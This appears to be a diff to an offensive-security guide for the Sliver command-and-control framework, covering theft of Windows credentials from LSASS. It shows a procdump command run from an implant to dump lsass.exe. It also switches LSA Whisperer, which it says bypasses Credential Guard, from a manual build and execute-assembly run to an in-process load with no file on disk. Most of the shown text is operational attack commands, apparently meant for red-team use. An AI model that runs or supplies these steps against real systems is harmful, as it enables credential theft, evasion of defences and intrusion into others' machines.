@@ -190,19 +190,11 @@ sliver (IMPLANT) > procdump -n lsass.exe -s /tmp/lsass.dmp
 
 ### LSA Whisperer — Credential Guard Bypass
 
-[LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer) by SpecterOps extracts credentials even with **Credential Guard enabled** by talking directly to LSA authentication packages via LSASS's public API. Not in armory — manual BOF load required.
-
-```bash
-# ─── Setup on Kali ───
-git clone https://github.com/EvanMcBroom/lsa-whisperer.git /opt/tools/lsa-whisperer
-cd /opt/tools/lsa-whisperer && mkdir build && cd build
-cmake .. -DCMAKE_BUILD_TYPE=Release && make
-# Produces: lsa-whisperer.exe (standalone) and BOF .o files
-```
+[LSA Whisperer](https://github.com/dazzyddos/lsawhisper-bof) extracts credentials even with **Credential Guard enabled** by talking directly to LSA authentication packages via LSASS's public API. Integrated as a BOF armory extension — built and installed automatically by `setup.sh`.
 
 ```
-# ─── From Sliver session (standalone exe via execute-assembly) ───
-sliver (IMPLANT) > execute-assembly /opt/tools/lsa-whisperer/build/lsa-whisperer.exe --msv
+# ─── Installed automatically by setup.sh (built from armory/lsa-whisperer/) ───
+# Runs in-process via coff-loader — no file on disk, no upload needed
 
 # ─── MSV1_0 module (DPAPI keys + NTLM — works WITH Credential Guard) ───
 # These extract DPAPI credential keys that Credential Guard normally protects:
